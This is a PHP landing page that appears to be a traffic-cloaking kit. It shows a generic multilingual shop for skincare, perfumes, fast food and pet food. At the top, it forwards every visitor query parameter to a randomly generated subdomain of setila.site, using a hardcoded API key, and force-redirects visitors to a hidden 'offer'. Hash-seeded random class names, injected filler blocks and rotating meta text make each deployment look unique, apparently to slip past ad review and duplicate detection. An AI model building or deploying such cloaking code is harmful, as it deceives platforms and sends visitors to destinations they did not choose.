<?php


	
	// Query params are: utm_term={keyword}&utm_creative={creative}&utm_campaign={campaignid}&utm_position={adposition}&utm_network={network}&utm_placement={placement}&utm_match={matchtype}&utm_target={target} 

	require_once dirname(__FILE__) . '/kclient.php';

	// Функция для генерации случайной строки
	function generateRandomSubdomain($length = 8) {
		$characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; // Символы для генерации
		$subdomain = '';
		for ($i = 0; $i < $length; $i++) {
			$subdomain .= $characters[rand(0, strlen($characters) - 1)];
		}
		return $subdomain;
	}

	// Генерация случайного субдомена
	$randomSubdomain = generateRandomSubdomain(); // Генерируем субдомен длиной 8 символов
	$apiUrl = "https://{$randomSubdomain}.setila.site/api.php";

	$client = new KClient($apiUrl, 'P4nmwPwq1d1h5mJb');
	$client->sendAllParams();       // to send all params from page query
	$client->forceRedirectOffer();   // redirect to offer if an offer is chosen
	// $client->param('sub_id_5', '123'); // you can send any params
	// $client->keyword('PASTE_KEYWORD');  // send custom keyword
	// $client->currentPageAsReferrer();   // to send current page URL as click referrer
	// $client->disableSessions();         // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
	// $client->debug();                   // to enable debug mode and show the errors
	// $client->execute();                 // request to api, show the output and continue
	$client->executeAndBreak();         // to stop page execution if there is redirect or some output

?>
<?php
include 'config.php';

// Определение языка на основе параметра sub12
$language = getLanguage();
$translations = getTranslations($language);

// Проверка, принято ли cookie-предупреждение
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['accept_cookies'])) {
    // Установка cookies с истечением через 1 год
    setcookie('cookies_accepted', '1', time() + (365 * 24 * 60 * 60), "/");
    header("Location: " . $_SERVER['PHP_SELF']); // Перезагрузка страницы после принятия
    exit;
}

$cookieAccepted = isset($_COOKIE['cookies_accepted']);

// Генерация хеша текущего домена или параметра sub12
$hash = md5($_SERVER['HTTP_HOST']); // Или используйте $_GET['sub12'] для хеширования
$hash_value = substr($hash, 0, 8); // Берем первые 8 символов хеша для создания уникальных классов
$hash_value2 = substr($hash, 4, 8); 
$hash_value3 = substr($hash, 2, 7);



// Функция для генерации уникальных классов и тегов на основе хеша
function generateUniqueClass($hash_value) {
    // Доступные префиксы для разнообразия
    $prefixes = [
    'style', 'block', 'item', 'unique', 'box', 'cls', 'itbl', 'polot', 'bert',
    'wrap', 'grid', 'container', 'panel', 'content', 'section', 'card', 'column', 
    'header', 'footer', 'sidebar', 'nav', 'layout', 'button', 'link', 'media', 
    'text', 'image', 'icon', 'input', 'form', 'popup', 'tooltip', 'badge', 
    'alert', 'modal', 'theme', 'animation', 'transition', 'hover', 'active'
];

    
    // Выбираем случайный префикс из массива, используя часть хеша
    $prefix_index = hexdec(substr($hash_value, 0, 1)) % count($prefixes);
    $prefix = $prefixes[$prefix_index];

    // Получаем уникальные части хеша
    $part1 = substr($hash_value, 2, 4);    // часть хеша для середины
    $part2 = substr($hash_value, -4);      // последняя часть хеша

    // Случайный разделитель
    $separators = ['_', '-', ''];
    $separator = $separators[hexdec(substr($hash_value, 1, 1)) % count($separators)];

    // Формируем имя класса с уникальным префиксом, частями хеша и случайным разделителем
    return $prefix . $separator . $part1 . $separator . $part2;
}

// Функция для генерации случайного элемента или блоков на основе хеша
function generateRandomElement($hash_value) {
    // Список случайных HTML-конструкций
    $elements = [
				'<div class="extra-block">
					<h2>Limited quantity offer</h2>
					<p>This is a brief description of the product, highlighting its main features.</p>
					<div class="inner-content">
						<section>
							<header><h3>Product Features</h3></header>
							<p>Detailed features of the product.</p>
							<ul>
								<li>Feature 1</li>
								<li>Feature 2</li>
								<li>Feature 3</li>
							</ul>
						</section>
					</div>
				</div>',

				'<span class="random-span">
					<b>Limited offer</b> 
					<i>Limited time offer on selected items</i>
					<small>Hurry up!</small>
				</span>',

				'<article class="extra-article">
					<header>
						<h2>Product Details</h2>
						<h3>Offer valid as long as the item is in stock</h3>
					</header>
					<p>The number of discounted items is limited</p>
					<section>
						<h4>Specifications</h4>
						<p>Some text with detailed specifications for the product.</p>
						<ul>
							<li>Specification A</li>
							<li>Specification B</li>
						</ul>
					</section>
					<footer>Product Footer</footer>
				</article>',

				'<section class="additional-section">
					<h3>Product Categories</h3>
					<p>Explore products from various categories.</p>
					<div>
						<ul>
							<li>Category 1</li>
							<li>Category 2</li>
							<li>Category 3</li>
						</ul>
						<div class="inner-box">
							<p>Additional information on categories</p>
						</div>
					</div>
				</section>',

				'<header class="random-header">
					<h3>Welcome to Our Store</h3>
					<nav>
						<ul>
							<li>Home</li>
							<li>Shop</li>
							<li>Contact Us</li>
						</ul>
					</nav>
				</header>',

				'<footer class="extra-footer">
					<p>Thank you for shopping with us!</p>
					<div class="footer-section">
						<h5>Customer Support</h5>
						<ul>
							<li>Shipping Info</li>
							<li>Returns & Exchanges</li>
							<li>FAQ</li>
						</ul>
					</div>
				</footer>',

				'<aside class="random-aside">
					<h4>Quick Links</h4>
					<p>Here you can find shortcuts to popular products and pages.</p>
					<div class="nested-aside">
						<h5>Shop by Brand</h5>
						<p>Explore products by top brands.</p>
					</div>
				</aside>',

				'<nav class="random-nav">
					<h4>Navigation</h4>
					<ul>
						<li>Home</li>
						<li>Categories</li>
						<li>Sale</li>
					</ul>
				</nav>',

				'<figure class="extra-figure">
					<figcaption>
						<div>
							<p>Product description and details about size, color, and style.</p>
						</div>
						<div>
							<p>Additional information such as warranty and care instructions.</p>
						</div>
					</figcaption>
				</figure>',

				'<blockquote class="random-quote">
					<p>"Amazing quality and fast shipping. Highly recommend!"</p>
				</blockquote>',

				'<div class="extra-wrapper">
					<h5>Shopping Cart</h5>
					<p>Your cart is empty. Start shopping now!</p>
					<div class="inner-wrapper">
						<h6>Cart Details</h6>
						<p>View your items in the cart.</p>
					</div>
				</div>',

				'<ul class="extra-list">
					<li>Product 1</li>
					<li>Product 2</li>
					<li>
						<ul class="nested-list">
							<li>Product 3</li>
							<li>Product 4</li>
						</ul>
					</li>
				</ul>',

				'<button class="random-button">
					<span class="button-text">Add to Cart</span>
					<div class="button-inner">
						<p>Click to add the item to your shopping cart.</p>
					</div>
				</button>',

				'<label class="random-label">       
				</label>'
			];



    // Сгенерируем количество случайных элементов
    $count = hexdec(substr($hash_value, 0, 2)) % 1 + 1; // Сколько элементов добавить (1-2)

    $output = '';
    for ($i = 0; $i < $count; $i++) {
        // Выбираем случайный элемент на основе текущей позиции и хеша
        $element_index = (hexdec(substr($hash_value, $i, 1)) + $i) % count($elements);
        $output .= $elements[$element_index];
    }

    return $output;
}


// Функция для перемешивания карточек товара
function shuffleProducts($products, $hash_value) {
    $seed = hexdec($hash_value);
    srand($seed);
    shuffle($products);
    return $products;
}

// Функция для загрузки описания сайта
function loadDescription($type, $language, $hash_value) {
    $filename = "descriptions/{$type}_{$language}.txt";
    
    if (file_exists($filename)) {
        $content = file_get_contents($filename);
        $descriptions = explode("===", $content);
        $index = hexdec(substr($hash_value, 0, 2)) % count($descriptions); // Выбор описания на основе хеша
        return trim($descriptions[$index]);
    }
    
    return "Description not found.";
}

// Функция для загрузки meta description
function loadMetaDescription($language, $hash_value) {
    $metaDescriptions = [
        'en' => [
  "A diverse range of skincare, fragrances, fast food, and pet food products, offering quality and care for both personal and pet needs.",
  "Wide selection of beauty essentials, perfumes, quick meals, and pet food, designed to enhance comfort and well-being for both people and pets.",
  "From cosmetics and fragrances to fast food and pet food, a variety of products that cater to everyday needs with quality and reliability.",
  "Beauty, perfumes, fast food, and pet food products that offer high-quality solutions for personal care and pet nutrition.",
  "Skincare, fragrance, fast food, and pet food items, crafted to improve the daily experiences of individuals and their pets.",
  "Explore a wide range of beauty, fragrance, fast food, and pet food products, each designed to deliver comfort and satisfaction to both people and pets.",
  "A broad assortment of beauty products, perfumes, quick meals, and pet food, all aimed at enhancing daily routines for people and their pets.",
  "Premium cosmetics, perfumes, fast food, and pet food offerings designed to meet the needs of individuals and their pets with care and quality.",
  "A selection of beauty, fragrance, fast food, and pet food products, offering solutions for personal care and nourishment for pets.",
  "Skincare, fragrance, fast food, and pet food products, all carefully selected to provide high-quality choices for both people and their pets."
],
        'fr' => [
  "Une gamme variée de soins de la peau, de parfums, de nourriture rapide et de nourriture pour animaux, offrant qualité et soin pour les besoins personnels et ceux des animaux.",
  "Une large sélection d'articles de beauté, de parfums, de repas rapides et de nourriture pour animaux, conçue pour améliorer le confort et le bien-être des personnes et des animaux.",
  "Des produits allant des cosmétiques et parfums aux repas rapides et à la nourriture pour animaux, offrant qualité et fiabilité pour les besoins quotidiens.",
  "Des produits de beauté, de parfumerie, de nourriture rapide et pour animaux offrant des solutions de haute qualité pour les soins personnels et la nutrition des animaux.",
  "Des soins de la peau, des parfums, des repas rapides et de la nourriture pour animaux, conçus pour améliorer l'expérience quotidienne des individus et de leurs animaux.",
  "Découvrez une large gamme de produits de beauté, de parfums, de repas rapides et de nourriture pour animaux, chacun conçu pour offrir confort et satisfaction aux personnes et aux animaux.",
  "Une large sélection de produits de beauté, de parfumerie, de repas rapides et de nourriture pour animaux, visant à améliorer les routines quotidiennes des personnes et de leurs animaux.",
  "Des cosmétiques, des parfums, de la nourriture rapide et des produits alimentaires pour animaux, conçus pour répondre aux besoins des individus et de leurs animaux avec soin et qualité.",
  "Une sélection de produits de beauté, de parfumerie, de repas rapides et de nourriture pour animaux, offrant des solutions pour les soins personnels et la nutrition des animaux.",
  "Des soins de la peau, des parfums, des repas rapides et de la nourriture pour animaux, soigneusement sélectionnés pour offrir des choix de haute qualité aux personnes et à leurs animaux."
],
        'es' => [
  "Una variedad de productos de cuidado de la piel, perfumes, comida rápida y alimentos para mascotas, que ofrecen calidad y cuidado para las necesidades personales y de los animales.",
  "Amplia selección de productos de belleza, perfumes, comida rápida y alimentos para mascotas, diseñados para mejorar el confort y bienestar de las personas y sus mascotas.",
  "Desde cosméticos y perfumes hasta comida rápida y alimentos para mascotas, una variedad de productos que satisfacen necesidades diarias con calidad y fiabilidad.",
  "Productos de belleza, perfumes, comida rápida y alimentos para mascotas que ofrecen soluciones de alta calidad para el cuidado personal y la nutrición de las mascotas.",
  "Productos de cuidado de la piel, perfumes, comida rápida y alimentos para mascotas, diseñados para mejorar la experiencia diaria de las personas y sus animales.",
  "Descubre una amplia gama de productos de belleza, perfumes, comida rápida y alimentos para mascotas, cada uno diseñado para ofrecer comodidad y satisfacción a las personas y a las mascotas.",
  "Una amplia selección de productos de belleza, perfumes, comida rápida y alimentos para mascotas, destinados a mejorar las rutinas diarias de las personas y sus animales.",
  "Cosméticos, perfumes, comida rápida y alimentos para mascotas diseñados para satisfacer las necesidades de las personas y sus mascotas con cuidado y calidad.",
  "Una selección de productos de belleza, perfumes, comida rápida y alimentos para mascotas, ofreciendo soluciones para el cuidado personal y la nutrición de las mascotas.",
  "Productos de cuidado de la piel, perfumes, comida rápida y alimentos para mascotas, cuidadosamente seleccionados para ofrecer opciones de alta calidad para las personas y sus animales."
],
'it' => [
  "Una vasta gamma di prodotti per la cura della pelle, profumi, cibo veloce e alimenti per animali, che offrono qualità e attenzione per le esigenze personali e degli animali.",
  "Ampia selezione di articoli di bellezza, profumi, cibo veloce e alimenti per animali, progettati per migliorare il comfort e il benessere di persone e animali.",
  "Dai cosmetici e profumi al cibo veloce e agli alimenti per animali, una varietà di prodotti che soddisfano le necessità quotidiane con qualità e affidabilità.",
  "Prodotti di bellezza, profumi, cibo veloce e alimenti per animali che offrono soluzioni di alta qualità per la cura personale e la nutrizione degli animali.",
  "Prodotti per la cura della pelle, profumi, cibo veloce e alimenti per animali, progettati per migliorare l'esperienza quotidiana delle persone e dei loro animali.",
  "Scopri una vasta gamma di prodotti di bellezza, profumi, cibo veloce e alimenti per animali, ognuno progettato per offrire comfort e soddisfazione a persone e animali.",
  "Una selezione di prodotti di bellezza, profumi, cibo veloce e alimenti per animali, destinati a migliorare le routine quotidiane delle persone e dei loro animali.",
  "Cosmetici, profumi, cibo veloce e alimenti per animali progettati per soddisfare le esigenze di persone e animali con attenzione e qualità.",
  "Una selezione di prodotti di bellezza, profumi, cibo veloce e alimenti per animali, che offrono soluzioni per la cura personale e la nutrizione degli animali.",
  "Prodotti per la cura della pelle, profumi, cibo veloce e alimenti per animali, selezionati con cura per offrire scelte di alta qualità a persone e animali."
],
'ro' => [
  "O gamă variată de produse pentru îngrijirea pielii, parfumuri, fast food și hrană pentru animale, care oferă calitate și îngrijire pentru nevoile personale și ale animalelor.",
  "Selecție largă de produse de frumusețe, parfumuri, mâncare rapidă și hrană pentru animale, concepute pentru a îmbunătăți confortul și bunăstarea oamenilor și animalelor.",
  "De la cosmetice și parfumuri la fast food și hrană pentru animale, o varietate de produse care răspund nevoilor zilnice cu calitate și fiabilitate.",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale care oferă soluții de înaltă calitate pentru îngrijirea personală și nutriția animalelor.",
  "Produse de îngrijire a pielii, parfumuri, fast food și hrană pentru animale, concepute pentru a îmbunătăți experiența zilnică a oamenilor și animalelor lor.",
  "Descoperiți o gamă largă de produse de frumusețe, parfumuri, fast food și hrană pentru animale, fiecare creat pentru a oferi confort și satisfacție oamenilor și animalelor.",
  "O selecție largă de produse de frumusețe, parfumuri, fast food și hrană pentru animale, menite să îmbunătățească rutina zilnică a oamenilor și animalelor lor.",
  "Cosmetice, parfumuri, fast food și hrană pentru animale concepute pentru a satisface nevoile oamenilor și animalelor cu grijă și calitate.",
  "O selecție de produse de frumusețe, parfumuri, fast food și hrană pentru animale, care oferă soluții pentru îngrijirea personală și nutriția animalelor.",
  "Produse de îngrijire a pielii, parfumuri, fast food și hrană pentru animale, selectate cu grijă pentru a oferi opțiuni de înaltă calitate oamenilor și animalelor lor."
],
'sk' => [
  "Rôzne produkty na starostlivosť o pleť, parfémy, rýchle jedlá a krmivá pre zvieratá, ktoré ponúkajú kvalitu a starostlivosť o osobné a zvieracie potreby.",
  "Široká ponuka výrobkov krásy, parfumov, rýchleho občerstvenia a krmív pre zvieratá, navrhnutá na zlepšenie pohodlia a pohody ľudí a ich domácich zvierat.",
  "Od kozmetiky a parfumov po rýchle jedlá a krmivá pre zvieratá, rôzne produkty, ktoré spĺňajú každodenné potreby s kvalitou a spoľahlivosťou.",
  "Produkty krásy, parfumy, rýchle jedlá a krmivá pre zvieratá, ktoré ponúkajú kvalitné riešenia pre starostlivosť o osobu a výživu zvierat.",
  "Produkty na starostlivosť o pleť, parfémy, rýchle jedlá a krmivá pre zvieratá, ktoré zlepšujú každodenné skúsenosti ľudí a ich domácich zvierat.",
  "Objavte širokú ponuku výrobkov krásy, parfumov, rýchleho občerstvenia a krmív pre zvieratá, každý produkt navrhnutý tak, aby ponúkol pohodlie a spokojnosť ľuďom a zvieratám.",
  "Široká ponuka produktov krásy, parfumov, rýchleho občerstvenia a krmív pre zvieratá, určená na zlepšenie každodenných rutín ľudí a ich domácich zvierat.",
  "Kozmetika, parfémy, rýchle jedlá a krmivá pre zvieratá navrhnuté na uspokojenie potrieb ľudí a ich zvierat s dôrazom na kvalitu a starostlivosť.",
  "Výber produktov krásy, parfumov, rýchleho občerstvenia a krmív pre zvieratá, ktoré ponúkajú riešenia pre starostlivosť o osobu a výživu zvierat.",
  "Produkty na starostlivosť o pleť, parfémy, rýchle jedlá a krmivá pre zvieratá, starostlivo vybrané na ponúknutie kvalitných možností pre ľudí a ich zvieratá."
]

    ];

    // Ensure the hash value is used to generate a consistent random index for the given language
    if (isset($metaDescriptions[$language])) {
        $metaList = $metaDescriptions[$language];
    } else {
        $metaList = $metaDescriptions['en']; // fallback to English if the language is not found
    }

    // Seed random number generation using the hash_value
    mt_srand(crc32($hash_value));  // crc32 gives a consistent integer hash of the string
    $randomIndex = mt_rand(0, count($metaList) - 1);

    return $metaList[$randomIndex];
}

// Функция для загрузки meta description
function loadMetaTitle($language, $hash_value) {
    $metaTitles = [
        'en' => [
  "Quality skincare, perfumes, fast food & pet food for everyday needs and care.",
  "Beauty, perfumes, fast food & pet food products for comfort and well-being.",
  "Cosmetics, perfumes, fast food & pet food for daily care and nourishment.",
  "Skincare, perfumes, fast food & pet food designed for personal and pet needs.",
  "Premium beauty, fragrances, fast food & pet food for personal and pet care.",
  "A range of beauty, perfume, fast food & pet food products for everyday comfort.",
  "Top beauty, perfumes, fast food & pet food for your personal and pet needs.",
  "Skincare, perfumes, fast food & pet food offering quality for all your needs.",
  "Beauty products, perfumes, fast food & pet food for personal and pet care.",
  "Explore beauty, perfumes, fast food & pet food for a better daily experience."
]
,
        'fr' => [
  "Soins de la peau, parfums, fast food et nourriture pour animaux pour tous les besoins.",
  "Produits de beauté, parfums, fast food et nourriture pour animaux pour le confort.",
  "Cosmétiques, parfums, fast food et nourriture pour animaux pour soins quotidiens.",
  "Soins de la peau, parfums, fast food et nourriture pour animaux pour tous les besoins.",
  "Produits de beauté, parfumerie, fast food et nourriture pour animaux de qualité.",
  "Une gamme de produits de beauté, parfums, fast food et nourriture pour animaux.",
  "Cosmétiques, parfums, fast food et nourriture pour animaux pour vos besoins quotidiens.",
  "Soins de la peau, parfums, fast food et nourriture pour animaux offrant qualité et soin.",
  "Produits de beauté, parfumerie, fast food et nourriture pour animaux pour bien-être.",
  "Découvrez des produits de beauté, parfums, fast food et nourriture pour animaux."
]
,
        'es' => [
  "Cuidado de la piel, perfumes, comida rápida y alimentos para mascotas para todos.",
  "Productos de belleza, perfumes, comida rápida y alimentos para mascotas de calidad.",
  "Cosméticos, perfumes, comida rápida y alimentos para mascotas para el cuidado diario.",
  "Cuidado de la piel, perfumes, comida rápida y alimentos para mascotas para todos.",
  "Productos de belleza, perfumes, comida rápida y alimentos para mascotas de calidad.",
  "Una variedad de productos de belleza, perfumes, comida rápida y alimentos para mascotas.",
  "Cosméticos, perfumes, comida rápida y alimentos para mascotas para el bienestar diario.",
  "Cuidado de la piel, perfumes, comida rápida y alimentos para mascotas con calidad.",
  "Productos de belleza, perfumes, comida rápida y alimentos para mascotas para el cuidado.",
  "Descubre productos de belleza, perfumes, comida rápida y alimentos para mascotas."
]
,
        'it' => [
  "Cura della pelle, profumi, fast food e cibo per animali per tutte le necessità.",
  "Prodotti di bellezza, profumi, fast food e cibo per animali di qualità.",
  "Cosmetici, profumi, fast food e cibo per animali per la cura quotidiana.",
  "Cura della pelle, profumi, fast food e cibo per animali per tutte le necessità.",
  "Prodotti di bellezza, profumi, fast food e cibo per animali di alta qualità.",
  "Una gamma di prodotti di bellezza, profumi, fast food e cibo per animali.",
  "Cosmetici, profumi, fast food e cibo per animali per il benessere quotidiano.",
  "Cura della pelle, profumi, fast food e cibo per animali con qualità e attenzione.",
  "Prodotti di bellezza, profumi, fast food e cibo per animali per ogni esigenza.",
  "Scopri prodotti di bellezza, profumi, fast food e cibo per animali di qualità."
]
,
        'ro' => [
  "Produse pentru îngrijirea pielii, parfumuri, fast food și hrană pentru animale.",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale de calitate.",
  "Cosmetice, parfumuri, fast food și hrană pentru animale pentru îngrijire zilnică.",
  "Produse pentru îngrijirea pielii, parfumuri, fast food și hrană pentru animale.",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale de înaltă calitate.",
  "O gamă de produse pentru frumusețe, parfumuri, fast food și hrană pentru animale.",
  "Cosmetice, parfumuri, fast food și hrană pentru animale pentru un confort zilnic.",
  "Produse pentru îngrijirea pielii, parfumuri, fast food și hrană pentru animale de calitate.",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale pentru fiecare nevoie.",
  "Descoperă produse de frumusețe, parfumuri, fast food și hrană pentru animale."
]
,
        'sk' => [
  "Produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá.",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá s vysokou kvalitou.",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá na každodennú starostlivosť.",
  "Produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá.",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá najvyššej kvality.",
  "Rôzne produkty na krásu, parfémy, fast food a krmivá pre zvieratá.",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá pre každodenný komfort.",
  "Produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá.",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá pre všetky potreby.",
  "Objavte kozmetiku, parfémy, fast food a krmivá pre zvieratá."
]

    ];

    // Ensure the hash value is used to generate a consistent random index for the given language
    if (isset($metaTitles[$language])) {
        $metaList = $metaTitles[$language];
    } else {
        $metaList = $metaTitles['en']; // fallback to English if the language is not found
    }

    // Seed random number generation using the hash_value
    mt_srand(crc32($hash_value));  // crc32 gives a consistent integer hash of the string
    $randomIndex = mt_rand(0, count($metaList) - 1);

    return $metaList[$randomIndex];
}
// Функция для загрузки meta description
function loadh1($language, $hash_value) {
    $metah1 = [
        'en' => [
  "Quality Skincare, Perfumes, Fast Food & Pet Food for Everyday Care",
  "Beauty, Perfumes, Fast Food & Pet Food for Daily Needs",
  "Top Skincare, Perfumes, Fast Food & Pet Food for a Better Experience",
  "A One-Stop Shop for Skincare, Perfumes, Fast Food & Pet Food",
  "Best Selection of Skincare, Perfumes, Fast Food & Pet Food",
  "Premium Beauty, Perfumes, Fast Food & Pet Food for Every Need",
  "The Best in Skincare, Perfumes, Fast Food & Pet Food for Comfort",
  "Top Skincare, Perfumes, Fast Food & Pet Food at Great Prices",
  "Beauty, Perfumes, Fast Food & Pet Food for Personal Care",
  "Essentials: Skincare, Perfumes, Fast Food & Pet Food"
],
        'fr' => [
  "Soins de la peau, parfums, fast food et nourriture pour animaux de qualité",
  "Produits de beauté, parfums, fast food et nourriture pour animaux de qualité",
  "Soins de la peau, parfums, fast food et nourriture pour animaux au quotidien",
  "Produits de beauté, parfumerie, fast food et nourriture pour animaux",
  "Sélection de soins de la peau, parfums, fast food et nourriture pour animaux",
  "Soins de la peau, parfums, fast food et nourriture pour animaux de haute qualité",
  "Offre complète de soins, parfums, fast food et nourriture pour animaux",
  "Produits de beauté, parfumerie, fast food et nourriture pour animaux de qualité",
  "Soins de la peau, parfums, fast food et nourriture pour animaux pour tous les jours",
  "Gamme de soins, parfums, fast food et nourriture pour animaux de qualité"
],
        'es' => [
  "Cuidado de la piel, perfumes, comida rápida y alimentos para mascotas de calidad",
  "Productos de belleza, perfumes, comida rápida y alimentos para mascotas",
  "Cuidado de la piel, perfumes, comida rápida y alimentos para mascotas todos los días",
  "Selección de productos de belleza, perfumes, comida rápida y alimentos para mascotas",
  "Productos de belleza, perfumes, comida rápida y alimentos para mascotas de alta calidad",
  "Mejor selección de cuidado de la piel, perfumes, comida rápida y alimentos",
  "Cuidado de la piel, perfumes, comida rápida y alimentos para mascotas de calidad",
  "Belleza, perfumes, comida rápida y alimentos para mascotas al alcance",
  "Productos de belleza, perfumes, comida rápida y alimentos para todas las necesidades",
  "Cuidado diario con productos de belleza, perfumes, comida rápida y alimentos"
],
        'it' => [
  "Prodotti per la cura della pelle, profumi, fast food e cibo per animali di qualità",
  "Selezione di prodotti per la bellezza, profumi, fast food e cibo per animali",
  "Cura della pelle, profumi, fast food e cibo per animali per l'uso quotidiano",
  "Cura della pelle, profumi, fast food e cibo per animali di alta qualità",
  "Prodotti di bellezza, profumi, fast food e cibo per animali per ogni esigenza",
  "Offerta di prodotti di bellezza, profumi, fast food e cibo per animali",
  "Cura della pelle, profumi, fast food e cibo per animali per un benessere quotidiano",
  "Gamme di prodotti di bellezza, profumi, fast food e cibo per animali di qualità",
  "Cura della pelle, profumi, fast food e cibo per animali per il benessere",
  "Selezione di prodotti di bellezza, profumi, fast food e cibo per animali"
]
,
        'ro' => [
  "Produse pentru îngrijirea pielii, parfumuri, fast food și hrană pentru animale",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale de calitate",
  "Produse pentru îngrijirea pielii, parfumuri, fast food și hrană pentru animale zilnic",
  "Selecție de produse de frumusețe, parfumuri, fast food și hrană pentru animale",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale de top",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale de calitate superioară",
  "Produse complete pentru frumusețe, parfumuri, fast food și hrană pentru animale",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale de înaltă calitate",
  "Produse pentru îngrijirea pielii, parfumuri, fast food și hrană pentru animale",
  "Produse de frumusețe, parfumuri, fast food și hrană pentru animale pentru toate nevoile"
]
,
        'sk' => [
  "Produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá na každý deň",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá pre každodennú starostlivosť",
  "Produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá",
  "Najlepšie produkty na krásu, parfémy, fast food a krmivá pre zvieratá",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá najvyššej kvality",
  "Rôzne produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá",
  "Produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá",
  "Kozmetika, parfémy, fast food a krmivá pre zvieratá na každodenné použitie",
  "Produkty na starostlivosť o pleť, parfémy, fast food a krmivá pre zvieratá"
]

    ];

    // Ensure the hash value is used to generate a consistent random index for the given language
    if (isset($metah1[$language])) {
        $metaList = $metah1[$language];
    } else {
        $metaList = $metah1['en']; // fallback to English if the language is not found
    }

    // Seed random number generation using the hash_value
    mt_srand(crc32($hash_value));  // crc32 gives a consistent integer hash of the string
    $randomIndex = mt_rand(0, count($metaList) - 1);

    return $metaList[$randomIndex];
}

// Функция для загрузки meta description
function loadh1dop($language, $hash_value) {
    $metah1 = [
        'en' => [
  "Special offer of the month",
  "Promotion of the month"
],
        'fr' => [
  "Offre spéciale du mois",
  "Promotion du mois"
],
        'es' => [
  "Oferta especial del mes",
  "Promoción del mes"
],
        'it' => [
  "Offerta speciale del mese",
  "Promozione del mese"
]
,
        'ro' => [
  "Oferta specială a lunii",
  "Promoția lunii"
]
,
        'sk' => [
  "Špeciálna ponuka mesiaca",
  "Propagácia mesiaca"
]

    ];

    // Ensure the hash value is used to generate a consistent random index for the given language
    if (isset($metah1[$language])) {
        $metaList = $metah1[$language];
    } else {
        $metaList = $metah1['en']; // fallback to English if the language is not found
    }

    // Seed random number generation using the hash_value
    mt_srand(crc32($hash_value));  // crc32 gives a consistent integer hash of the string
    $randomIndex = mt_rand(0, count($metaList) - 1);

    return $metaList[$randomIndex];
}

?>

<!DOCTYPE html>
<html lang="<?php echo $language; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars(loadMetaTitle($language, $hash_value)); ?></title>
    <meta name="description" content="<?php echo htmlspecialchars(loadMetaDescription($language, $hash_value)); ?>">
    <link rel="stylesheet" href="styles/style.css">
</head>
<body>
    

    <header class="<?php echo generateUniqueClass($hash_value); ?>">
        <h1><?php echo htmlspecialchars(loadh1dop($language, $hash_value)); ?>|<?php echo htmlspecialchars(loadh1($language, $hash_value)); ?></h1>
    </header>
    <section class="description-section <?php echo generateUniqueClass($hash_value2); ?>">
    <p class="description-text"><?php echo loadDescription('start', $language, $hash_value); ?></p>
	</section>

    <main class="<?php echo generateUniqueClass($hash_value3); ?>">
        <section class="products <?php echo generateUniqueClass($hash_value.$hash_value3); ?>">
            
            
            <?php echo generateRandomElement($hash_value); ?>

            <?php
            

            // Перемешиваем товары в зависимости от хеша
            $products = shuffleProducts($products, $hash_value);

            foreach ($products as $product) {
                $description = loadProductDescription($product['category'], $language, $product['indez']);
                $image = getRandomImage($product['img'], $product['indez']);				
                $product_class = generateUniqueClass($hash_value.$hash_value2);
            ?>
			<?php echo generateRandomElement($hash_value.$product['name']); ?>
                <div class="product-card <?php echo $product_class; ?>">
				<a href="product.php?name=<?php echo urlencode($product['name']); ?>">
                    <img src="<?php echo htmlspecialchars($image); ?>" alt="<?php echo htmlspecialchars($product['name']); ?>" class="product-image">
                    <h2 class="<?php echo $product_class; ?>"><?php echo htmlspecialchars($product['name']); ?></h2>
					</a>
					<?php echo generateRandomElement($product['name']); ?>
                    <p class="<?php echo $product_class; ?>"><?php echo htmlspecialchars($description); ?></p>
                    <p class="price <?php echo $product_class; ?>"><?php echo $translations['price']; ?></p>
                    <a href="order.php?product=<?php echo urlencode($product['name']); ?>" class="order-btn"><?php echo $translations['order']; ?></a>
                </div>
				<?php echo generateRandomElement($hash_value3); ?>
            <?php } ?>
        </section>
    </main>

    <section class="description-section <?php echo $hash_value2; ?>">
        <p class="description-text"><?php echo loadDescription('end', $language, $hash_value); ?></p>
    </section>

    <footer class="<?php echo $hash_value3; ?>">
        <a href="terms.html">Terms & Conditions</a> |
        <a href="privacy.html">Privacy policy</a> |
        <a href="return.html">Returns, Refunds and Exchanges Policy</a>|
        <a href="disclaimer.html">Disclaimer</a>
    </footer>
	
<?php if (!$cookieAccepted): ?>
    <div class="cookie-banner">
        <p>
            <?php echo $translations['cookie_text'] ?? "We use cookies to improve your experience on our site. By continuing, you accept our use of cookies. <a href=\"privacy.html\">Learn more</a>"; ?>
        </p>
        <form method="POST" action="">
            <button type="submit" name="accept_cookies" class="accept-button">
                <?php echo $translations['accept_cookies'] ?? "Accept Cookies"; ?>
            </button>
        </form>
    </div>
<?php endif; ?>

</body>
</html>
